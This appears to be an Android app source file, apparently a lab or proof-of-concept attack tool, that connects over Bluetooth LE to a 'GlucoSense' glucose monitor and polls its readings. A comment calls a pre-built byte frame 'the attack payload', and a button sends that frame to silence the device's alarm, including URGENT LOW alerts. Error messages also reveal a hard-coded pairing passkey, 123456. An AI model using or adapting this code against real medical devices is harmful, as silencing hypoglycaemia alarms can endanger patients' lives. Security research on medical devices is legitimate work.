package com.glucosense.viewer;

import android.Manifest;
import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothManager;
import android.bluetooth.BluetoothProfile;
import android.bluetooth.le.BluetoothLeScanner;
import android.bluetooth.le.ScanCallback;
import android.bluetooth.le.ScanFilter;
import android.bluetooth.le.ScanResult;
import android.bluetooth.le.ScanSettings;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.ParcelUuid;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class MainActivity extends Activity {
    private static final String TAG = "GlucoSense";

    // NUS UUIDs
    private static final UUID NUS_SERVICE_UUID = UUID.fromString("6e400001-b5a3-f393-e0a9-e50e24dcca9e");
    private static final UUID NUS_RX_UUID = UUID.fromString("6e400002-b5a3-f393-e0a9-e50e24dcca9e");
    private static final UUID NUS_TX_UUID = UUID.fromString("6e400003-b5a3-f393-e0a9-e50e24dcca9e");
    private static final UUID CCCD_UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb");

    // Pre-computed STATUS request frame
    private static final byte[] STATUS_REQUEST = new byte[] {
        (byte)0x7E, 0x00, 0x00, 0x10, 0x20, 0x30, 0x00, 0x00,
        (byte)0xAF, 0x0C, (byte)0xEF
    };

    // Pre-computed ALARM_SET(silence) frame - the attack payload
    private static final byte[] ALARM_SILENCE = new byte[] {
        (byte)0x7E, 0x00, 0x00, 0x10, 0x20, 0x20, 0x00, 0x01, 0x00,
        0x55, (byte)0xAA, (byte)0xEF
    };

    private BluetoothAdapter bluetoothAdapter;
    private BluetoothLeScanner scanner;
    private BluetoothGatt gatt;
    private BluetoothGattCharacteristic rxChar;
    private BluetoothGattCharacteristic txChar;

    private Handler handler;
    private boolean isConnected = false;
    private boolean isSubscribed = false;
    private boolean isScanning = false;
    private String connectedAddress = null;

    // Device discovery
    private Map<String, BluetoothDevice> discoveredDevices = new HashMap<String, BluetoothDevice>();
    private Map<String, String> deviceNames = new HashMap<String, String>();
    private Map<String, View> deviceViews = new HashMap<String, View>();

    // UI elements
    private LinearLayout deviceListContainer;
    private TextView scanningStatus;
    private TextView connectionStatus;
    private TextView glucoseValue;
    private TextView glucoseUnit;
    private TextView alarmBanner;
    private TextView errorMessage;
    private Button silenceAlarmBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        setContentView(R.layout.activity_main);

        handler = new Handler(Looper.getMainLooper());

        // Bind UI
        deviceListContainer = (LinearLayout) findViewById(R.id.deviceListContainer);
        scanningStatus = (TextView) findViewById(R.id.scanningStatus);
        connectionStatus = (TextView) findViewById(R.id.connectionStatus);
        glucoseValue = (TextView) findViewById(R.id.glucoseValue);
        glucoseUnit = (TextView) findViewById(R.id.glucoseUnit);
        alarmBanner = (TextView) findViewById(R.id.alarmBanner);
        errorMessage = (TextView) findViewById(R.id.errorMessage);
        silenceAlarmBtn = (Button) findViewById(R.id.silenceAlarmBtn);

        silenceAlarmBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendAlarmSilence();
            }
        });

        // Init Bluetooth
        BluetoothManager btManager = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);
        bluetoothAdapter = btManager.getAdapter();

        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled()) {
            showError("Bluetooth not available or disabled");
            return;
        }

        scanner = bluetoothAdapter.getBluetoothLeScanner();

        // Request permissions on newer Android
        if (Build.VERSION.SDK_INT >= 31) {
            requestPermissions(new String[]{
                Manifest.permission.BLUETOOTH_SCAN,
                Manifest.permission.BLUETOOTH_CONNECT
            }, 1);
        } else if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION
            }, 1);
        } else {
            startScan();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        if (allGranted) {
            startScan();
        } else {
            showError("Permissions required for BLE scanning");
        }
    }

    private void addDeviceToList(final String address, final String name) {
        if (deviceViews.containsKey(address)) {
            return;
        }

        // Create device item view programmatically
        LinearLayout itemView = new LinearLayout(this);
        itemView.setOrientation(LinearLayout.HORIZONTAL);
        itemView.setPadding(24, 24, 24, 24);
        itemView.setBackgroundColor(Color.WHITE);

        LinearLayout.LayoutParams itemParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        itemParams.setMargins(0, 8, 0, 8);
        itemView.setLayoutParams(itemParams);

        // Indicator
        TextView indicator = new TextView(this);
        indicator.setText("○"); // Empty circle
        indicator.setTextSize(18);
        indicator.setTextColor(Color.parseColor("#CCCCCC"));
        indicator.setPadding(0, 0, 16, 0);
        indicator.setTag("indicator");

        // Device name
        TextView nameView = new TextView(this);
        nameView.setText(name);
        nameView.setTextSize(16);
        nameView.setTextColor(Color.parseColor("#333333"));
        LinearLayout.LayoutParams nameParams = new LinearLayout.LayoutParams(
            0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        nameView.setLayoutParams(nameParams);
        nameView.setTag("name");

        // Status
        TextView statusView = new TextView(this);
        statusView.setText("Tap to connect");
        statusView.setTextSize(12);
        statusView.setTextColor(Color.parseColor("#888888"));
        statusView.setTag("status");

        itemView.addView(indicator);
        itemView.addView(nameView);
        itemView.addView(statusView);

        // Click listener
        itemView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                connectToDevice(address);
            }
        });

        deviceViews.put(address, itemView);
        deviceListContainer.addView(itemView);

        // Hide scanning status when we have devices
        scanningStatus.setVisibility(View.GONE);
    }

    private void updateDeviceState(String address, boolean connected) {
        View itemView = deviceViews.get(address);
        if (itemView == null) return;

        TextView indicator = (TextView) itemView.findViewWithTag("indicator");
        TextView statusView = (TextView) itemView.findViewWithTag("status");

        if (connected) {
            indicator.setText("●"); // Filled circle
            indicator.setTextColor(Color.parseColor("#22AA22")); // Green
            statusView.setText("Connected");
            statusView.setTextColor(Color.parseColor("#22AA22"));
            itemView.setBackgroundColor(Color.parseColor("#E8F5E9")); // Light green bg
        } else {
            indicator.setText("○"); // Empty circle
            indicator.setTextColor(Color.parseColor("#CCCCCC"));
            statusView.setText("Tap to connect");
            statusView.setTextColor(Color.parseColor("#888888"));
            itemView.setBackgroundColor(Color.WHITE);
        }
    }

    private void startScan() {
        if (scanner == null || isScanning) {
            return;
        }

        scanningStatus.setVisibility(View.VISIBLE);
        scanningStatus.setText("Scanning for devices...");
        isScanning = true;

        List<ScanFilter> filters = new ArrayList<ScanFilter>();
        filters.add(new ScanFilter.Builder()
            .setServiceUuid(new ParcelUuid(NUS_SERVICE_UUID))
            .build());

        ScanSettings settings = new ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
            .build();

        try {
            scanner.startScan(filters, settings, scanCallback);
            Log.i(TAG, "Scan started");
        } catch (SecurityException e) {
            showError("Scan permission denied");
            isScanning = false;
        }

        // Update scanning status periodically
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isScanning && discoveredDevices.isEmpty()) {
                    scanningStatus.setText("Still scanning...");
                }
            }
        }, 3000);

        // Stop scan after 15 seconds but keep rescanning
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isScanning) {
                    stopScan();
                    if (discoveredDevices.isEmpty()) {
                        scanningStatus.setText("No devices found. Rescanning...");
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                startScan();
                            }
                        }, 2000);
                    }
                }
            }
        }, 15000);
    }

    private void stopScan() {
        if (scanner != null && isScanning) {
            try {
                scanner.stopScan(scanCallback);
            } catch (Exception e) {
                Log.e(TAG, "Error stopping scan: " + e.getMessage());
            }
            isScanning = false;
        }
    }

    private ScanCallback scanCallback = new ScanCallback() {
        @Override
        public void onScanResult(int callbackType, ScanResult result) {
            BluetoothDevice device = result.getDevice();
            final String addr = device.getAddress();
            String name = null;

            try {
                name = device.getName();
            } catch (SecurityException e) {
                name = "Unknown";
            }

            if (name == null) {
                name = "GlucoSense Device";
            }

            // Only add GlucoSense devices
            if (name.contains("GlucoSense") || name.contains("Gluco")) {
                if (!discoveredDevices.containsKey(addr)) {
                    discoveredDevices.put(addr, device);
                    deviceNames.put(addr, name);
                    Log.i(TAG, "Found device: " + name + " addr=" + addr);

                    final String deviceName = name;
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            addDeviceToList(addr, deviceName);
                        }
                    });
                }
            }
        }

        @Override
        public void onScanFailed(int errorCode) {
            Log.e(TAG, "Scan failed: " + errorCode);
            handler.post(new Runnable() {
                @Override
                public void run() {
                    showError("Scan failed");
                    isScanning = false;
                }
            });
        }
    };

    private void connectToDevice(String address) {
        // Disconnect current device if different
        if (connectedAddress != null && !connectedAddress.equals(address)) {
            if (gatt != null) {
                try {
                    gatt.disconnect();
                    gatt.close();
                } catch (Exception e) {
                    Log.e(TAG, "Error disconnecting: " + e.getMessage());
                }
                gatt = null;
            }
            updateDeviceState(connectedAddress, false);
            isConnected = false;
            isSubscribed = false;
        }

        if (pollRunnable != null) {
            handler.removeCallbacks(pollRunnable);
        }

        BluetoothDevice device = discoveredDevices.get(address);
        if (device == null) return;

        String name = deviceNames.get(address);
        if (name == null) name = "device";

        stopScan();
        connectedAddress = address;

        // Update UI
        View itemView = deviceViews.get(address);
        if (itemView != null) {
            TextView statusView = (TextView) itemView.findViewWithTag("status");
            statusView.setText("Connecting...");
            statusView.setTextColor(Color.parseColor("#2196F3")); // Blue
        }

        connectionStatus.setText("Connecting to " + name + "...");
        glucoseValue.setText("---");
        alarmBanner.setText("Connecting...");
        alarmBanner.setBackgroundColor(Color.parseColor("#888888"));
        hideError();

        try {
            gatt = device.connectGatt(this, false, gattCallback, BluetoothDevice.TRANSPORT_LE);
        } catch (SecurityException e) {
            showError("Connection permission denied");
        }
    }

    /**
     * Clears Android's cached GATT service table for this peripheral.
     *
     * BluetoothGatt.refresh() is a hidden API with no public equivalent, so it
     * has to be called reflectively. Without it, discoverServices() can return a
     * cached table from an earlier connection.
     */
    private boolean refreshDeviceCache(BluetoothGatt gatt) {
        try {
            java.lang.reflect.Method refresh = gatt.getClass().getMethod("refresh");
            if (refresh != null) {
                Boolean result = (Boolean) refresh.invoke(gatt);
                Log.d(TAG, "GATT cache refresh: " + result);
                return result != null && result;
            }
        } catch (Exception e) {
            Log.w(TAG, "GATT cache refresh unavailable: " + e);
        }
        return false;
    }

    private BluetoothGattCallback gattCallback = new BluetoothGattCallback() {
        @Override
        public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) {
            Log.i(TAG, "Connection state: status=" + status + " newState=" + newState);

            if (status != BluetoothGatt.GATT_SUCCESS) {
                final String errorMsg;
                if (status == 133) {
                    errorMsg = "CONNECTION FAILED (133)";
                } else if (status == 8) {
                    errorMsg = "CONNECTION TIMEOUT";
                } else if (status == 19) {
                    errorMsg = "DISCONNECTED BY DEVICE";
                } else if (status == 62) {
                    errorMsg = "PAIRING FAILED - Enter passkey: 123456";
                } else {
                    errorMsg = "CONNECTION ERROR: " + status;
                }
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        isConnected = false;
                        isSubscribed = false;
                        if (connectedAddress != null) {
                            updateDeviceState(connectedAddress, false);
                        }
                        showError(errorMsg);
                        connectionStatus.setText("");
                    }
                });
                return;
            }

            if (newState == BluetoothProfile.STATE_CONNECTED) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        connectionStatus.setText("Discovering services...");
                    }
                });

                // Clear cached GATT table to handle peripheral service changes
                final BluetoothGatt g = gatt;
                refreshDeviceCache(g);

                // Delay discovery - some Android stacks return incomplete tables if started immediately
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            g.discoverServices();
                        } catch (SecurityException e) {
                            showError("Service discovery permission denied");
                        }
                    }
                }, 600);
            } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        isConnected = false;
                        isSubscribed = false;
                        if (connectedAddress != null) {
                            updateDeviceState(connectedAddress, false);
                        }
                        connectionStatus.setText("");
                        glucoseValue.setText("---");
                        alarmBanner.setText("Disconnected");
                        alarmBanner.setBackgroundColor(Color.parseColor("#888888"));
                    }
                });
            }
        }

        @Override
        public void onServicesDiscovered(BluetoothGatt gatt, int status) {
            Log.i(TAG, "Services discovered, status=" + status);
            if (status != BluetoothGatt.GATT_SUCCESS) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        showError("Service discovery failed: " + status);
                    }
                });
                return;
            }

            // Debug: log all discovered services
            for (BluetoothGattService s : gatt.getServices()) {
                Log.d(TAG, "Found service: " + s.getUuid());
            }

            BluetoothGattService nusService = gatt.getService(NUS_SERVICE_UUID);
            if (nusService == null) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        showError("NUS service not found");
                    }
                });
                return;
            }

            rxChar = nusService.getCharacteristic(NUS_RX_UUID);
            txChar = nusService.getCharacteristic(NUS_TX_UUID);

            if (rxChar == null || txChar == null) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        showError("NUS characteristics not found");
                    }
                });
                return;
            }

            handler.post(new Runnable() {
                @Override
                public void run() {
                    connectionStatus.setText("Subscribing...");
                }
            });

            try {
                gatt.setCharacteristicNotification(txChar, true);
                BluetoothGattDescriptor desc = txChar.getDescriptor(CCCD_UUID);
                if (desc != null) {
                    desc.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);
                    gatt.writeDescriptor(desc);
                }
            } catch (SecurityException e) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        showError("Notification permission denied");
                    }
                });
            }
        }

        @Override
        public void onDescriptorWrite(BluetoothGatt gatt, BluetoothGattDescriptor descriptor, int status) {
            if (status == BluetoothGatt.GATT_SUCCESS) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        isConnected = true;
                        isSubscribed = true;
                        hideError();
                        String name = connectedAddress != null ? deviceNames.get(connectedAddress) : "device";
                        connectionStatus.setText("Connected to " + name);
                        if (connectedAddress != null) {
                            updateDeviceState(connectedAddress, true);
                        }
                        startPolling();
                    }
                });
            } else if (status == BluetoothGatt.GATT_INSUFFICIENT_ENCRYPTION ||
                       status == BluetoothGatt.GATT_INSUFFICIENT_AUTHENTICATION) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        showError("ENCRYPTION REQUIRED\nEnter passkey: 123456");
                    }
                });
            } else {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        showError("Subscribe failed: " + status);
                    }
                });
            }
        }

        @Override
        public void onCharacteristicWrite(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status) {
            if (status != BluetoothGatt.GATT_SUCCESS) {
                Log.w(TAG, "Write failed: " + status);
                if (status == BluetoothGatt.GATT_INSUFFICIENT_ENCRYPTION ||
                    status == BluetoothGatt.GATT_INSUFFICIENT_AUTHENTICATION) {
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            showError("WRITE FAILED - Enter passkey: 123456");
                        }
                    });
                }
            }
        }

        @Override
        public void onCharacteristicChanged(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic) {
            final byte[] data = characteristic.getValue();
            if (data != null && data.length > 0) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        parseResponse(data);
                    }
                });
            }
        }
    };

    private Runnable pollRunnable;

    private void startPolling() {
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                if (isConnected && isSubscribed && rxChar != null && gatt != null) {
                    sendStatusRequest();
                    handler.postDelayed(this, 2000);
                }
            }
        };
        handler.post(pollRunnable);
    }

    private void sendStatusRequest() {
        if (rxChar == null || gatt == null) return;

        try {
            java.lang.reflect.Method writeMethod = null;
            try {
                writeMethod = gatt.getClass().getMethod("writeCharacteristic",
                    BluetoothGattCharacteristic.class, byte[].class, int.class);
                writeMethod.invoke(gatt, rxChar, STATUS_REQUEST,
                    BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
            } catch (NoSuchMethodException e) {
                java.lang.reflect.Method setValue = rxChar.getClass().getMethod("setValue", byte[].class);
                setValue.invoke(rxChar, (Object) STATUS_REQUEST);
                rxChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
                gatt.writeCharacteristic(rxChar);
            }
            Log.d(TAG, "Sent STATUS request");
        } catch (SecurityException e) {
            showError("Write permission denied");
        } catch (Exception e) {
            Log.e(TAG, "Write error: " + e.getMessage());
        }
    }

    private void sendAlarmSilence() {
        if (rxChar == null || gatt == null || !isConnected) {
            showError("Not connected");
            return;
        }

        try {
            java.lang.reflect.Method writeMethod = null;
            try {
                writeMethod = gatt.getClass().getMethod("writeCharacteristic",
                    BluetoothGattCharacteristic.class, byte[].class, int.class);
                writeMethod.invoke(gatt, rxChar, ALARM_SILENCE,
                    BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
            } catch (NoSuchMethodException e) {
                java.lang.reflect.Method setValue = rxChar.getClass().getMethod("setValue", byte[].class);
                setValue.invoke(rxChar, (Object) ALARM_SILENCE);
                rxChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
                gatt.writeCharacteristic(rxChar);
            }
            Log.d(TAG, "Sent ALARM_SET(silence)");
        } catch (SecurityException e) {
            showError("Write permission denied");
        } catch (Exception e) {
            Log.e(TAG, "Write error: " + e.getMessage());
        }
    }

    private void parseResponse(byte[] data) {
        Log.d(TAG, "Received " + data.length + " bytes");

        if (data.length < 11 || data[0] != 0x7E || data[data.length - 1] != (byte)0xEF) {
            Log.w(TAG, "Invalid frame structure");
            return;
        }

        if (data.length >= 6 && data[2] == 0x01 && data[5] == 0x30) {
            int payloadLen = ((data[6] & 0xFF) << 8) | (data[7] & 0xFF);

            if (payloadLen >= 4 && data.length >= 8 + payloadLen + 3) {
                int payloadStart = 8;
                int glucose = ((data[payloadStart] & 0xFF) << 8) | (data[payloadStart + 1] & 0xFF);
                int alarmState = data[payloadStart + 2] & 0xFF;
                int authState = data[payloadStart + 3] & 0xFF;

                updateDisplay(glucose, alarmState, authState);
            }
        }
    }

    private void updateDisplay(int glucose, int alarmState, int authState) {
        glucoseValue.setText(String.valueOf(glucose));

        if (alarmState == 0) {
            alarmBanner.setText("In range");
            alarmBanner.setBackgroundColor(Color.parseColor("#22AA22"));
        } else {
            alarmBanner.setText("URGENT LOW");
            alarmBanner.setBackgroundColor(Color.parseColor("#CC0000"));
        }

        hideError();
    }

    private void showError(final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                errorMessage.setText(message);
                errorMessage.setVisibility(View.VISIBLE);
            }
        });
    }

    private void hideError() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                errorMessage.setVisibility(View.GONE);
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopScan();
        if (pollRunnable != null) {
            handler.removeCallbacks(pollRunnable);
        }
        if (gatt != null) {
            try {
                gatt.disconnect();
                gatt.close();
            } catch (Exception e) {
                Log.e(TAG, "Error closing GATT: " + e.getMessage());
            }
        }
    }
}
